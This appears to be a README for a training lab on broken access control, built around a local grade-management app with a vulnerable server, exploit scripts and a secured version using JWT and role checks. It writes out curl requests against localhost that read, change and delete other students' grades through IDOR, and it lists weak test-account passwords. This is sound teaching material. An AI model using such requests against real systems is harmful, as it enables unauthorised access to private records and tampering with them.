# Broken Access Control - Practical Labs

This lab demonstrates OWASP Top 10 #1 vulnerability: Broken Access Control using a Grade Management System.

> **Related Lesson:** See [`/lessons/owasp-top-10/broken-access-control.md`](/lessons/owasp-top-10/broken-access-control.md) for the complete theoretical guide.

## Lab Overview

| Lab | Description | Learning Objective |
|-----|-------------|-------------------|
| **Lab 1** | Vulnerable Grade System | Understand broken access control in action |
| **Lab 2** | Exploitation Testing | Practice IDOR and privilege escalation |
| **Lab 3** | Secure Implementation | Implement proper auth & authorization |

## Prerequisites

- Node.js 18+
- npm

## Setup

```bash
cd labs/grade-system
npm install
npm run init-db
```

## Test Accounts

| Role | Email | Password |
|------|-------|----------|
| Student | ezra@student.edu | password123 |
| Teacher | smith@teacher.edu | password123 |
| Admin | admin@school.edu | password123 |

---

## Lab 1: Vulnerable Grade System

### Objectives
- Understand how broken access control works
- Identify missing authentication and authorization

### Run Vulnerable Server

```bash
npm start
```

Server runs at `http://localhost:3000`

### Vulnerabilities Present

1. **No Authentication** - Anyone can access endpoints
2. **No Authorization** - No role checks
3. **IDOR** - Can access any student's data by changing studentid
4. **No Ownership Validation** - Students can modify other students' grades
5. **No Role-Based Access Control** - Any user can perform any action

### Test with cURL

```bash
# View any student's grades (IDOR)
curl "http://localhost:3000/api/grades?studentid=20223949&subjectid=1293"

# Modify any grade (no authorization)
curl -X PATCH "http://localhost:3000/api/grades" \
  -H "Content-Type: application/json" \
  -d '{"studentId":"20223948","subjectId":"1293","grade":"HD"}'

# Delete grades (anyone can do it!)
curl -X DELETE "http://localhost:3000/api/grades?studentid=20223950&subjectid=1293"
```

---

## Lab 2: Exploitation Testing

### Objectives
- Exploit IDOR vulnerabilities
- Test horizontal and vertical privilege escalation
- Perform mass data exfiltration

### Run Exploitation Script

```bash
# First, start the vulnerable server in one terminal
npm start

# In another terminal, run the exploit script
chmod +x exploit.sh
./exploit.sh
```

### Manual Exploitation Steps

1. **IDOR - View Other Students' Grades**
   ```bash
   # Change studentid to access different students
   curl "http://localhost:3000/api/grades?studentid=20223949&subjectid=1293"
   ```

2. **Modify Your Own Grade**
   ```bash
   curl -X PATCH "http://localhost:3000/api/grades" \
     -H "Content-Type: application/json" \
     -d '{"studentId":"20223948","subjectId":"1293","grade":"HD"}'
   ```

3. **Modify Other Students' Grades**
   ```bash
   curl -X PATCH "http://localhost:3000/api/grades" \
     -H "Content-Type: application/json" \
     -d '{"studentId":"20223949","subjectId":"1293","grade":"F"}'
   ```

4. **Delete Grades**
   ```bash
   curl -X DELETE "http://localhost:3000/api/grades?studentid=20223950&subjectid=1293"
   ```

### Mass IDOR Script

```bash
chmod +x mass-idor.py
python3 mass-idor.py
```

This script enumerates student IDs and extracts all grade data.

---

## Lab 3: Secure Implementation

### Objectives
- Implement JWT authentication
- Add role-based access control (RBAC)
- Validate resource ownership
- Add audit logging

### Run Secure Server

```bash
npm run start:secure
```

Server runs at `http://localhost:3000`

### Security Controls Implemented

1. **JWT Authentication** - All endpoints require valid token
2. **Role-Based Access Control (RBAC)**
   - Students: Can only view their own grades
   - Teachers: Can view all grades, modify grades
   - Admins: Full access including delete
3. **Ownership Validation** - Users can only access their own data (unless elevated role)
4. **Audit Logging** - All modifications are logged

### Test Security Controls

```bash
chmod +x test-secure.sh
./test-secure.sh
```

### Expected Results

| Test | User | Action | Result |
|------|------|--------|--------|
| View own grades | Student | GET | ✓ Success |
| View other's grades | Student | GET | ✗ 403 Denied |
| Modify grade | Student | PATCH | ✗ 403 Denied |
| View any grades | Teacher | GET | ✓ Success |
| Modify grade | Teacher | PATCH | ✓ Success |
| Delete grade | Teacher | DELETE | ✗ 403 Denied |
| Delete grade | Admin | DELETE | ✓ Success |
| No token | - | GET | ✗ 401 Unauthorized |

---

## API Reference

### Endpoints

| Method | Endpoint | Description | Auth Required | Role |
|--------|----------|-------------|---------------|------|
| POST | /api/login | Get JWT token | No | Any |
| GET | /api/grades | View grade | Yes | Student/Teacher/Admin |
| PATCH | /api/grades | Update grade | Yes | Teacher/Admin |
| DELETE | /api/grades | Delete grade | Yes | Admin |

### Query Parameters

- `studentid` - Student ID (e.g., 20223948)
- `subjectid` - Subject ID (e.g., 1293)

### Request Examples

**Login:**
```bash
curl -X POST "http://localhost:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"ezra@student.edu","password":"password123"}'
```

**View Grade (with token):**
```bash
curl "http://localhost:3000/api/grades?studentid=20223948&subjectid=1293" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"
```

**Update Grade (teacher/admin):**
```bash
curl -X PATCH "http://localhost:3000/api/grades" \
  -H "Authorization: Bearer YOUR_TOKEN_HERE" \
  -H "Content-Type: application/json" \
  -d '{"studentId":"20223948","subjectId":"1293","grade":"A"}'
```

---

## Reset Database

To reset the database to its initial state:

```bash
npm run init-db
```

This will:
- Recreate all tables
- Reset all grades to original values
- Reset all passwords to 'password123'

---

## Learning Summary

### Vulnerabilities Found in Lab 1

- [ ] Missing authentication middleware
- [ ] No authorization checks
- [ ] Insecure Direct Object Reference (IDOR)
- [ ] No role-based access control
- [ ] No resource ownership validation

### Fixes Applied in Lab 3

- [ ] JWT token authentication
- [ ] Role-based access control (RBAC)
- [ ] Resource ownership validation
- [ ] Audit logging
- [ ] Input validation

---

## Files

```
grade-system/
├── package.json           # Dependencies
├── init-db.js            # Database initialization
├── vulnerable-server.js  # Vulnerable implementation
├── secure-server.js      # Secure implementation
├── exploit.sh            # Exploitation test script
├── test-secure.sh        # Security test script
├── mass-idor.py          # Mass IDOR enumeration
├── README.md             # This file
└── grade_system.db       # SQLite database (auto-generated)
```
